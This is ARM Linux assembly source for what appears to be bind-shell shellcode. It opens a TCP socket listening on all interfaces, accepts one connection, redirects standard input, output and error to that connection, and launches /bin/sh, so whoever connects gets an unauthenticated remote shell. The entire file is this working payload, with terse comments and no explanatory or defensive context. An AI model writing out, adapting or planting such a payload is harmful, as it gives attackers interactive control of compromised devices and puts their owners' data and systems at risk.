.global _start
_start:
 
  @ sockfd = socket(int socket_family, int socket_type, int protocol);
  mov r0, #2         @ PF_INET = 2
  mov r1, #1         @ SOCK_STREAM = 1
  mov r2, #0         @ IPPROTO_IP = 0
  ldr r7, =#281      @ socketcall
  swi 0
 
  @ r0 contains the fd returned by the syscall
  mov r6, r0 @ file descriptor
 
  @ int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
  adr r1, _sockaddr  @ sockaddr struct
  mov r2, #0x10      @ addrlen
  mov r0, r6         @ mov sockfd into r0
  ldr r7, =#282      @ bind syscall 
  swi 0
 
  @ int listen(int sockfd, int backlog);
  mov r0, r6         @ mov sockfd into r0
  mov r1, #1         @ backlog=1
  ldr r7, =#284      @ listen syscall
  swi 0
 
  @ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
  mov r0, r6         @ mov sockfd into r0
  sub r1, r1, r1     @ addr=0
  sub r2, r2, r2     @ addrlen=0
  ldr r7, =#285      @ accept syscall
  swi 0
 
  @ Redirect stdin, stdout and stderr via dup2
  @ r0 = acccept ret value 
  mov r1, #2         @ counter stdin(0), stdout(1) and stderr(2)
  loop:
    mov r7, #63      @ dup2 syscall
    swi 0
    sub r1, r1, #1   @ decrement counter
    cmp r1, #-1      @ compare r1 with -1
    bne loop         @ if the result is not equal jmp to loop
 
  @ int execve(const char *filename, char *const argv[],char *const envp[]);
  adr r0, _sh
  mov r1, #0         @ argv=NULL
  mov r2, r1         @ envp=NULL
  mov r7, #11        @ exceve syscall
  swi 0
 
_exit:
  mov r0, #0
  mov r7, #1
  swi 0              @ exit(0)

_sh: 
  .asciz "/bin/sh"

_sockaddr:
  .hword 2                @ sin_family
  .hword 0xb315           @ sin_port
  .word  0                @ sin_addr
  .byte  0,0,0,0,0,0,0,0  @ sin_zero 
